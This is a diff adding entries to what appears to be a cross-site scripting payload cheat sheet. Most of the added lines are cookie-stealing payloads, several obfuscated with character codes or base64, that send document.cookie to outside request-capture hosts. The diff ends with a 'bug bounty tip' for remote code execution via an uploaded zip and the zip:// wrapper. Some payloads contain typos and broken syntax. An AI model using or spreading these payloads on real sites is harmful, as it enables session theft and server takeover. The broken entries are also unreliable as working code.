@@ -100,4 +100,53 @@ img{background-image:url('javascript:alert()')}
 
 ?age=25;location=/javascript:alert%25281%2529/.source; :>
 
+#  xss Cookie steal
+<script>document.write('<img src="https://httpreq.com/odd-leaf-yde1fu7p/record?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');</script>
+
+# xss
+<keygen autofocus onfocus=alert(1)>
+
+# xss cookie steal encode with charcode 
+<keygen autofocus onfocus=(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39,41))>
+
+<script>location=atob("aHR0cDovLzE5Mi4xNjguMS4zL3oucGhwP3k9").concat(document.cookie)</script>
+
+<keygen autofocus onfocus=document.write(String.fromCharCode(39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39)+document.cookie+String.fromCharCode(39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39))/>
+
+<keygen autofocus onfocus=document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61)+document.cookie(String.fromCharCode(119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62)))/>
+
+<keygen autofocus onfocus=a=document;a.write(
+    String.fromCharCode(60,105,109,103,32,115,114,99,61,39,
+    104,116,116,112,115,58,47,47,98,99,53,57,98,97,56,49,98,
+    48,52,100,49,97,57,97,57,100,53,101,99,51,49,49,98,49,56,
+    56,97,49,55,55,46,109,46,112,105,112,101,100,114,101,97,
+    109,46,110,101,116,63,116,101,115,116,61).concat(a.cookie)
+    .concat(String.fromCharCode(39,47,62))) />
+     )/>
+
+<keygen autofocus onfocus=<script>location=atob("aHR0cHM6Ly9odHRwcmVxLmNvbS9vZGQtbGVhZi15ZGUxZnU3cC9yZWNvcmQ/Y21kPQ==").concat(document.cookie)</script> />
+
+<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>
+
+<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>
+
+<keygen autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249Jy8vc2VuZC5oZXJlLm1lPycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;))>
+
+title=cyberpunker&message=<button autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249J2h0dHBzOi8vaHR0cHJlcS5jb20vb2RkLWxlYWYteWRlMWZ1N3AvcmVjb3JkP2NtZD0nK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==&quot;))>
+
+# Bug Bounty Hunting Tip by Shivam Tahalani
+
+If you can upload .zip file on target then:
+
+1. Create a .php file (rce.php)
+
+2. Compress it to a .zip file (file.zip)
+
+3. Upload your .zip file on the vulnerable web application.
+
+4. Trigger your RCE via:
+
+( https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php )
+
+
 
